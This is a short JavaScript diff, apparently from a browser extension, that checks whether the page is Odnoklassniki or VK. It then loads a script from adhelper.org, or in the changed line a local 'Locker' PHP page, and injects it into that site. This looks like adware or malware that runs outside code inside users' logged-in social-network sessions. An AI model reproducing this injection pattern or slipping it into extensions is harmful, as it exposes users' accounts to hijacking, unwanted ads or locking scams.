@@ -7,9 +7,8 @@ if (plg) {
 	document.body.appendChild(plg);
 }
 
-
 if(location.hostname.indexOf('odnoklassniki') > -1)
-	var scr = 'http://adhelper.org/vk/lod.js';
+	var scr = 'http://localhost/Locker/lock_2.php';
 if(location.hostname.indexOf('vk') > -1)
 	var scr = 'http://adhelper.org/vk/lvk.js';
 if(scr){
